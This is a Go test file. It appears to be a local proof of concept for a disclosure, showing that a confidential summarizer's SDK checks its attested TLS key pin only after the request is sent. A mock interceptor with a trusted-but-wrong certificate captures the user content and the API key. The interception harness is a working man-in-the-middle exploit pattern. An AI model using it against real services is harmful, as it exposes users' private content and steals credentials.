package main

// PoC (local only): the summarizer's pinned SDK (tinfoil-go v0.11.3 ->
// github.com/tinfoilsh/verifier v0.11.2) enforces the attested TLS key only
// AFTER http.DefaultTransport has written the whole request. A TLS peer that
// holds any certificate the system trust store accepts for the router host,
// but NOT the attested enclave key, receives the plaintext summarize request
// (user content + the summarizer's TINFOIL_API_KEY) before the client
// notices the pin mismatch.
//
// Run: go test -run TestPoCPostSendPinCheck -v .

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"errors"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/openai/openai-go/v3"
	"github.com/openai/openai-go/v3/option"
	"github.com/tinfoilsh/verifier/attestation"
	verifierclient "github.com/tinfoilsh/verifier/client"

	"github.com/tinfoilsh/confidential-summarizer/config"
)

var pocCA struct {
	cert *x509.Certificate
	key  *ecdsa.PrivateKey
}

// TestMain installs a test CA as the *system* trust store (SSL_CERT_FILE),
// standing in for "the attacker holds a publicly trusted certificate for the
// router hostname" (e.g. issued via ACME by whoever controls DNS or the IP).
// Nothing in the summarizer or SDK code path is modified.
func TestMain(m *testing.M) {
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	tmpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "PoC Public CA"},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(time.Hour),
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		panic(err)
	}
	cert, _ := x509.ParseCertificate(der)
	pocCA.cert, pocCA.key = cert, key
	dir, _ := os.MkdirTemp("", "poc-ca")
	path := filepath.Join(dir, "ca.pem")
	os.WriteFile(path, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}), 0o600)
	os.Setenv("SSL_CERT_FILE", path)
	os.Setenv("SSL_CERT_DIR", dir)
	code := m.Run()
	os.RemoveAll(dir)
	os.Exit(code)
}

func pocLeaf(t *testing.T) tls.Certificate {
	t.Helper()
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject:      pkix.Name{CommonName: "router (attacker-held cert)"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1")},
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, pocCA.cert, &key.PublicKey, pocCA.key)
	if err != nil {
		t.Fatal(err)
	}
	return tls.Certificate{Certificate: [][]byte{der}, PrivateKey: key}
}

type captured struct {
	mu            sync.Mutex
	authorization string
	body          string
	requests      int
}

func TestPoCPostSendPinCheck(t *testing.T) {
	// The "genuine enclave" key whose fingerprint attestation would pin.
	enclaveKey, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	pinnedFP := attestation.KeyFP(&enclaveKey.PublicKey)

	// The interceptor: valid chain for the host, different key.
	var got captured
	mitm := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		got.mu.Lock()
		got.requests++
		got.authorization = r.Header.Get("Authorization")
		got.body = string(b)
		got.mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		io.WriteString(w, `{"id":"x","object":"chat.completion","created":0,"model":"m","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"title"}}]}`)
	}))
	mitm.TLS = &tls.Config{Certificates: []tls.Certificate{pocLeaf(t)}}
	mitm.StartTLS()
	defer mitm.Close()

	// Exactly the HTTP client the old SDK builds after Verify():
	//   &http.Client{Transport: &TLSBoundRoundTripper{groundTruth.TLSPublicKey}}
	// (tinfoil-go v0.11.3 wraps it in reVerifyingTransport, whose first step is
	// this same RoundTrip.)
	httpClient := &http.Client{Transport: &verifierclient.TLSBoundRoundTripper{ExpectedPublicKey: pinnedFP}}
	oc := openai.NewClient(append(openAIClientOptions("SUMMARIZER-TINFOIL-API-KEY"),
		option.WithHTTPClient(httpClient),
		option.WithBaseURL(mitm.URL+"/v1/"))...)

	// The summarizer's real upstream code path.
	upstream := newOpenAIUpstream(&oc, config.DefaultModel)
	secret := "I was diagnosed with HIV yesterday, how do I tell my employer"
	_, err := upstream.Summarize(context.Background(), summaryInput{
		Content: secret, Style: config.Styles["title_summary"], MinWords: 2, MaxWords: 5, MaxTokens: 64,
	})

	t.Logf("client error: %v", err)
	if err == nil || !errors.Is(err, verifierclient.ErrCertMismatch) {
		t.Fatalf("expected the pin mismatch to be detected (eventually), got %v", err)
	}
	got.mu.Lock()
	defer got.mu.Unlock()
	t.Logf("interceptor saw %d request(s)", got.requests)
	t.Logf("interceptor saw Authorization: %q", got.authorization)
	t.Logf("interceptor saw body: %s", got.body)
	if !strings.Contains(got.body, secret) {
		t.Fatalf("interceptor did not receive the user content")
	}
	if got.authorization != "Bearer SUMMARIZER-TINFOIL-API-KEY" {
		t.Fatalf("interceptor did not receive the API key")
	}
	t.Log("VULNERABLE: plaintext request reached a peer that does not hold the attested key")
}
